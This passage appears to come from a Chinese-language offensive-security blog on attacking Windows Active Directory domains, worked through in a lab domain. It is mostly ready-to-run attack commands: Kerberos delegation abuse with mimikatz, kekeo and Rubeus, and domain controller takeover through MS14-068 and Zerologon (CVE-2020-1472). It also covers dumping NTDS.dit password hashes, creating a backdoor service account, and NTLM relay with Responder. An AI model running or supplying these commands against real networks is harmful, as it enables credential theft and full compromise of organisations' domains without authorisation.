<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali下自带，需要用户名和密码</span><br><span class="line">ldapsearch -x -H ldap://<span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span>:<span class="number">389</span> -D &quot;CN=ddh,CN=Users,DC=tt,DC=com&quot; -w Admin123 -b &quot;DC=tt,DC=com&quot; &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; |grep -iE &quot;distinguishedName&quot;</span><br><span class="line">在远程非域计算机上查询需要账号密码</span><br><span class="line">dsquery.exe * -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span> -u ddh -p Admin123 -filter &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot;</span><br><span class="line">AdFind.exe -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span> -u ddh -up Admin123 -f &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; cn operatingSystem distinguishedName</span><br><span class="line">如果whoami是域用户，则可以不用账号密码</span><br><span class="line">dsquery.exe * -filter &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot;</span><br><span class="line">AdFind.exe -f &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; cn operatingSystem distinguishedName</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20200830133802114.png" alt="image-20200830133802114"></p>
<p>找到计算机后，还要有这台计算机的权限，还需要目标用户（如域管理员）登录过后才能抓到票据。</p>
<p>导出和使用参考缓存票据的使用。</p>
<p>还是使用qs进行查询最方便，直接批量跑指定IP，或者所有域计算机（不推荐）。</p>
<p><img src="/images/image-20200830152214740.png" alt="image-20200830152214740"></p>
<h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h3><ul>
<li><p><strong>效果</strong></p>
<p>域服务账号/计算机可以去请求其他指定服务的票据，这个得看域管理员给这个服务开了其它哪些服务的权限。</p>
<p>类似于SSO中不同用户有不同的权限，可以打开不同的网站。 </p>
</li>
<li><p><strong>条件</strong></p>
</li>
<li><p><strong>操作一（计算机账号具有约束委派权限）</strong></p>
</li>
</ul>
<p>测试环境先直接给3B6这台计算机添加约束委派</p>
<p><img src="/images/image-20200904165530806.png" alt="image-20200904165530806"></p>
<p>查找域中的委派关系：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -f <span class="string">&quot;(&amp;(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msDS-AllowedToDelegateTo</span><br><span class="line">dsquery.exe * -filter <span class="string">&quot;(&amp;(msds-allowedtodelegateto=*))&quot;</span> -<span class="built_in">limit</span> 0 -attr distinguishedName msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure>

<p>如果有3B6的权限，可直接导出票据，或者有之前的计算机hash，用hash去申请票据。在用票据去申请有委派权限服务的ST</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz privilege::debug <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="built_in">exit</span></span><br><span class="line">kekeo <span class="string">&quot;tgs::s4u /tgt:WIN-V5480N4V3B6<span class="variable">$@krbtgt</span>-TT.COM.kirbi /user:administrator /service:cifs/WIN-J341S97EGGH.tt.com&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;kerberos::golden /domain:tt.com /admin:NoThisUser /sid:S-1-5-21-1881962959-1052950955-462027270  /rc4:1b190b45caa545358a8b711f69fe6971 /target:WIN-V5480N4V3B6 /service:CIFS /ticket&quot;</span> <span class="built_in">exit</span></span><br><span class="line">kekeo <span class="string">&quot;tgs::s4u /tgt:ticket.kirbi /user:administrator@tt.com /service:cifs/WIN-J341S97EGGH.tt.com&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>导入ST，访问服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz privilege::debug <span class="string">&quot;kerberos::ptt C:\Users\ddh\Desktop\TGS_administrator@TT.COM_WIN-V5480N4V3B6<span class="variable">$@TT</span>.COM.kirbi&quot;</span> <span class="built_in">exit</span></span><br><span class="line">dir \\WIN-J341S97EGGH\c$</span><br></pre></td></tr></table></figure>



<ul>
<li><strong>操作二（服务账号具有约束委派权限）</strong></li>
</ul>
<p>测试环境先给用户添加约束委派权限（实际情况是目标域的管理员为了维护或使用资源而添加的）：</p>
<p>特别注意，还需要把普通账号设置为服务账号。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">New-ADUser -Name <span class="string">&quot;Backdoor&quot;</span> -SamAccountName backdoor_svc -UserPrincipalName backdoor_svc@tt.com -ServicePrincipalNames <span class="string">&quot;backdoor/backdoor.tt.com&quot;</span> -AccountPassword (convertto-securestring <span class="string">&quot;Admin123&quot;</span> -asplaintext -force)  -PasswordNeverExpires <span class="variable">$True</span>  -PassThru | Enable-ADAccount</span><br><span class="line"><span class="variable">$user</span> = Get-ADUser backdoor_svc</span><br><span class="line">Set-ADObject <span class="variable">$user</span> -Add @&#123; <span class="string">&quot;msDS-AllowedToDelegateTo&quot;</span> = @(<span class="string">&quot;HOST/WIN-J341S97EGGH.tt.com&quot;</span>) &#125;</span><br><span class="line">Set-ADAccountControl <span class="variable">$user</span> -TrustedToAuthForDelegation <span class="variable">$true</span></span><br></pre></td></tr></table></figure>

<p>  查找域中的委派关系：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -f <span class="string">&quot;(&amp;(msds-allowedtodelegateto=*))&quot;</span> cn userPrincipalName distinguishedName msDS-AllowedToDelegateTo</span><br><span class="line">dsquery.exe * -filter <span class="string">&quot;(&amp;(msds-allowedtodelegateto=*))&quot;</span> -<span class="built_in">limit</span> 0 -attr userPrincipalName distinguishedName msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ddh\Desktop&gt;AdFind.exe -f <span class="string">&quot;(&amp;(msds-allowedtodelegateto=*))&quot;</span> cn userPrincipalName distinguishedName msDS-AllowedToDelegateTo</span><br><span class="line">  </span><br><span class="line">  dn:CN=Backdoor,CN=Users,DC=tt,DC=com</span><br><span class="line">&gt;cn: Backdoor</span><br><span class="line">&gt;distinguishedName: CN=Backdoor,CN=Users,DC=tt,DC=com</span><br><span class="line">&gt;userPrincipalName: backdoor_svc@tt.com</span><br><span class="line">&gt;msDS-AllowedToDelegateTo: cifs/WIN-J341S97EGGH.tt.com/tt.com</span><br><span class="line">&gt;msDS-AllowedToDelegateTo: cifs/WIN-J341S97EGGH.tt.com</span><br><span class="line">&gt;msDS-AllowedToDelegateTo: cifs/WIN-J341S97EGGH</span><br><span class="line">&gt;msDS-AllowedToDelegateTo: cifs/WIN-J341S97EGGH.tt.com/TT</span><br><span class="line">&gt;msDS-AllowedToDelegateTo: cifs/WIN-J341S97EGGH/TT</span><br></pre></td></tr></table></figure>

<p>发现backdoor_svc账号拥有cifs/WIN-J341S97EGGH.tt.com服务权限，申请对应服务的ST：</p>
<p>使用kekeo（失败）:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先申请用户的TGT，如果控制的主机上登录的有backdoor_svc用户，则使用sekurlsa::tickets /<span class="built_in">export</span>导出backdoor_svc的票据也行</span><br><span class="line">kekeo <span class="string">&quot;tgt::ask /user:backdoor_svc /domain:tt.com /NTLM:e45a314c664d40a227f9540121d1a29d&quot;</span> <span class="built_in">exit</span></span><br><span class="line">kekeo <span class="string">&quot;tgt::ask /user:backdoor_svc /domain:tt.com /password:Admin123&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">申请ST</span><br><span class="line">kekeo <span class="string">&quot;tgs::s4u /tgt:TGT_backdoor_svc@TT.COM_krbtgt~tt.com@TT.COM.kirbi /user:administrator@tt.com /service:HOST/WIN-J341S97EGGH.tt.com&quot;</span> <span class="built_in">exit</span></span><br><span class="line">导入ST</span><br><span class="line">mimikatz privilege::debug <span class="string">&quot;kerberos::ptt C:\Users\ddh\Desktop\TGS_administrator@tt.com@TT.COM_backdoor_svc@TT.COM.kirbi&quot;</span> <span class="built_in">exit</span></span><br><span class="line">访问服务</span><br><span class="line">dir \\WIN-J341S97EGGH\c$</span><br></pre></td></tr></table></figure>

<p>使用getst（成功）:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getst.exe -dc-ip 192.168.19.8 -spn cifs&#x2F;WIN-J341S97EGGH.tt.com -impersonate Administrator tt.com&#x2F;backdoor_svc:Admin123</span><br><span class="line">mimikatz privilege::debug &quot;kerberos::ptc C:\Users\ddh\Desktop\Administrator.ccache&quot; exit</span><br></pre></td></tr></table></figure>

<p>使用Rubeus（成功）:</p>
  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:backdoor_svc /domain:tt.com /rc4:e45a314c664d40a227f9540121d1a29d /impersonateuser:administrator /msdsspn:cifs/WIN-J341S97EGGH.tt.com /altservice:cifs /ptt</span><br></pre></td></tr></table></figure>

<h3 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericall-genericwrite-write-on-computer">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericall-genericwrite-write-on-computer</a></p>
</blockquote>
<ul>
<li><p>原理</p>
<p>普通域用户默认可以创建最多10个新的计算机账户</p>
<p>不需要域管理员权限去设置基于资源的约束委派（Resource-based constrained delegation）相关属性</p>
<p>普通域用户可以设置资源约束委派相关属性</p>
</li>
<li><p>条件</p>
<p>一个普通域用户权限</p>
<p>域控为Server 2012及以上版本</p>
<p>对目标主机拥有写权限</p>
</li>
<li><p>操作</p>
</li>
</ul>
<p>测试环境是在一台域计算机上登录的普通域用户</p>
<p>创建一个名为testpc的计算机账户，并获取testpc的SID</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount testpc -Password $(ConvertTo-SecureString <span class="string">&quot;Admin123&quot;</span> -AsPlainText -Force)</span><br><span class="line"></span><br><span class="line">dsquery.exe * -filter <span class="string">&quot;(&amp;(sAMAccountName=testpc$))&quot;</span> -<span class="built_in">limit</span> 0 -attr *</span><br><span class="line">这里获取到的为 S-1-5-21-4030334565-2237076002-3168552227-1603</span><br></pre></td></tr></table></figure>

<p>配置基于资源的约束委派属性</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import-module .\Microsoft.ActiveDirectory.Management.dll</span><br><span class="line"><span class="variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4030334565-2237076002-3168552227-1603)&quot;</span></span><br><span class="line"><span class="variable">$SDBytes</span> = New-Object byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, 0)</span><br><span class="line"></span><br><span class="line">Import-Module .\PowerSploit-master\PowerSploit.psm1</span><br><span class="line">Get-DomainComputer WIN-JSGIJOFK3T7 | Set-DomainObject -Set @&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; -Verbose</span><br><span class="line">Get-DomainComputer WIN-JSGIJOFK3T7 -Properties msds-allowedtoactonbehalfofotheridentity</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>配置完msDS-AllowedToActOnBehalfOfOtherIdentity属性之后就可以通过基于资源的约束委派去攻击目标主机了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">将密码转换为<span class="built_in">hash</span></span><br><span class="line">Rubeus.exe <span class="built_in">hash</span> /user:testpc /password:Admin123 /domain:ddh.com</span><br><span class="line"></span><br><span class="line">然后用testpc$的<span class="built_in">hash</span>请求白银票据并导入到当前会话中</span><br><span class="line">Rubeus.exe s4u /user:testpc$ /rc4:E45A314C664D40A227F9540121D1A29D /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</span><br></pre></td></tr></table></figure>





<h1 id="一键打域控"><a href="#一键打域控" class="headerlink" title="一键打域控"></a>一键打域控</h1><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><ul>
<li><p><strong>效果</strong></p>
<p>从普通域用户提升为域管理员</p>
</li>
<li><p><strong>条件</strong></p>
<p>一个普通域账号及其正确的密码</p>
<p>未打补丁 KB3011780</p>
</li>
<li><p><strong>操作</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;exploit::ms14068 /domain:tt.com /user:ddh /password:Admin123 /ptt&quot; <span class="keyword">exit</span></span><br><span class="line">psexec \\WIN-J341S97EGGH.tt.com <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goldenPac.exe tt.com/ddh:Admin123@WIN-J341S97EGGH.tt.com</span><br></pre></td></tr></table></figure></li>
<li><p>实践</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">MS14</span>-068.<span class="title">exe</span> -<span class="title">u</span> <span class="title">ddh</span>@<span class="title">tt.com</span> -<span class="title">p</span> <span class="title">Admin123</span> -<span class="title">s</span> <span class="title">S</span>-1-5-21-1881962959-1052950955-462027270 -<span class="title">d</span> <span class="title">WIN</span></span></span><br><span class="line"><span class="function">-<span class="title">J341S97EGGH.tt.com</span></span></span><br><span class="line"><span class="function">  [+] <span class="title">Building</span> <span class="title">AS</span>-<span class="title">REQ</span> <span class="title">for</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Sending</span> <span class="title">AS</span>-<span class="title">REQ</span> <span class="title">to</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Receiving</span> <span class="title">AS</span>-<span class="title">REP</span> <span class="title">from</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Parsing</span> <span class="title">AS</span>-<span class="title">REP</span> <span class="title">from</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Building</span> <span class="title">TGS</span>-<span class="title">REQ</span> <span class="title">for</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Sending</span> <span class="title">TGS</span>-<span class="title">REQ</span> <span class="title">to</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Receiving</span> <span class="title">TGS</span>-<span class="title">REP</span> <span class="title">from</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Parsing</span> <span class="title">TGS</span>-<span class="title">REP</span> <span class="title">from</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Creating</span> <span class="title">ccache</span> <span class="title">file</span> &#x27;<span class="title">TGT_ddh</span>@<span class="title">tt.com.ccache</span>&#x27;... <span class="title">Done</span>!</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="CVE-2019-1040"><a href="#CVE-2019-1040" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;QAX-A-Team&#x2F;dcpwn</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20210104164910176.png" alt="image-20210104164910176"></p>
<h3 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h3><p>安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dirkjanm&#x2F;CVE-2020-1472</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket&#x2F;archive&#x2F;master.zip</span><br><span class="line">cd impacket-master</span><br><span class="line">pip install .</span><br></pre></td></tr></table></figure>



<p>第一步</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py3 cve-2020-1472-exploit.py DC_HOSTNAME DC_IP</span><br><span class="line">py3 cve-2020-1472-exploit.py WIN-DDOA470G8AI 11.1.1.131</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20201107101519800.png" alt="image-20201107101519800"></p>
<p>第二步</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(注意下面的命令如果在linux上，$需要转义为\$)</span><br><span class="line">py3 impacket-master\examples\secretsdump.py WIN-DDOA470G8AI$@11.1.1.131 -just-dc -no-pass</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20201107101544723.png" alt="image-20201107101544723"></p>
<p>第三步</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py3 impacket-master\examples\wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:30a96699356033b84283b8918a895d67 administrator@11.1.1.131</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20201107101619262.png" alt="image-20201107101619262"></p>
<h1 id="域hash"><a href="#域hash" class="headerlink" title="域hash"></a>域hash</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hash 值存储在域控制器中（C:\Windows\NTDS\NTDS.DIT）</span><br><span class="line">NTDS.DIT 文件经常被操作系统使用，无法直接复制到其它位置。</span><br></pre></td></tr></table></figure>

<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:god.org &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure>



<h3 id="ntdsutil导出快照"><a href="#ntdsutil导出快照" class="headerlink" title="ntdsutil导出快照"></a>ntdsutil导出快照</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;activate instance ntds&quot;</span> create quit quit</span><br><span class="line">GUID 为 &#123;aa488f5b-40c7-4044-b24f-16fd041a6de2&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;mount GUID&quot;</span> quit quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制 ntds.dit</span></span><br><span class="line">copy C:\$SNAP_201908200435_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;unmount GUID&quot;</span> quit quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;delete GUID&quot;</span> quit quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;List All&quot;</span> quit quit</span><br><span class="line">ntdsutil snapshot <span class="string">&quot;List Mounted&quot;</span> quit quit</span><br></pre></td></tr></table></figure>



<h3 id="vssadmin创建卷影"><a href="#vssadmin创建卷影" class="headerlink" title="vssadmin创建卷影"></a>vssadmin创建卷影</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 查询当前系统的快照</span><br><span class="line">vssadmin list shadows</span><br><span class="line"></span><br><span class="line"># 创建快照</span><br><span class="line">vssadmin create shadow &#x2F;for&#x3D;c: &#x2F;autoretry&#x3D;10</span><br><span class="line">&quot;Shadow Copy Volume Name&quot; 为 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</span><br><span class="line">&quot;Shadow Copy ID&quot; 为 &#123;aa488f5b-40c7-4044-b24f-16fd041a6de2&#125;</span><br><span class="line"></span><br><span class="line"># 复制 ntds.dit</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line"># 删除快照</span><br><span class="line">vssadmin delete shadows &#x2F;for&#x3D;c: &#x2F;quiet</span><br></pre></td></tr></table></figure>



<h3 id="Invoke-NinjaCopy"><a href="#Invoke-NinjaCopy" class="headerlink" title="Invoke-NinjaCopy"></a>Invoke-NinjaCopy</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1</span><br><span class="line">.\Invoke-NinjaCopy.ps1 -path c:\windows\system32\config\system -localdestination c:\<span class="built_in">test</span>\ -verbose -computername workstationvm</span><br></pre></td></tr></table></figure>



<h3 id="从ntds-dit还原"><a href="#从ntds-dit还原" class="headerlink" title="从ntds.dit还原"></a>从ntds.dit还原</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/zcgonvh/NTDSDumpEx</span><br><span class="line">usage: ntdsdumpex.exe &lt;-d ntds.dit&gt; &lt;-k HEX-SYS-KEY | -s system.hiv |-r&gt; [-o out.txt] [-h] [-m] [-p] [-u]</span><br><span class="line">-d    path of ntds.dit database</span><br><span class="line">-k    use specified SYSKEY</span><br><span class="line">-s    parse SYSKEY from specified system.hiv</span><br><span class="line">-r    <span class="built_in">read</span> SYSKEY from registry</span><br><span class="line">-o    write output into</span><br><span class="line">-h    dump <span class="built_in">hash</span> histories(<span class="keyword">if</span> available)</span><br><span class="line">-p    dump description and path of home directory</span><br><span class="line">-m    dump machine accounts</span><br><span class="line">-u    USE UPPER-CASE-HEX</span><br><span class="line"></span><br><span class="line"><span class="comment"># 离线模式：先导出注册表</span></span><br><span class="line">reg save hklm\system system.hiv</span><br><span class="line">NTDSDumpEx.exe -d ntds.dit -s system.hiv -o hash.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在线模式：无需导出注册表</span></span><br><span class="line">NTDSDumpEx.exe -d ntds.dit -r -o hash.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -ntds.dit -system system.hive LOCAL</span><br></pre></td></tr></table></figure>



<h1 id="中间人"><a href="#中间人" class="headerlink" title="中间人"></a>中间人</h1><h3 id="NTLM中继"><a href="#NTLM中继" class="headerlink" title="NTLM中继"></a>NTLM中继</h3><ul>
<li><p><strong>原理</strong></p>
<p>在局域网中发送LLMNR欺骗、WPAD劫持、DHCP（IPv6）欺骗等，实现中间人攻击</p>
<p>中间人劫持到SMB流量、http basic认证流量等，从中进行修改和利用</p>
<p>关闭了SMB签名的主机才能进行smb劫持，http劫持不受签名影响，但是获取的net-ntlm。</p>
</li>
<li><p><strong>条件</strong></p>
<p>同C段下系统权限主机一台</p>
</li>
<li><p><strong>操作</strong></p>
</li>
</ul>
<p>首先通过Responder进行中间人攻击，-i 参数为本机IP，修改Responder.conf配置文件，将SMB和HTTP模块设置为Off，这个由ntlmrelayx模块来专门做smb的中继。当主机通过IE浏览器访问任意网站时，Responder将劫持为返回一个401的响应，而浏览器收到后自动将本地的认证信息带上后再次请求，从而获取到Net-NTLM，可以用来破解。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder.exe -i 192.168.19.136 -rdwPv</span><br></pre></td></tr></table></figure>

<img src="/images/image-20200907144743847.png" alt="image-20200907144743847" style="zoom:80%;" />

<p><img src="/images/image-20200907152938971.png" alt="image-20200907152938971"></p>
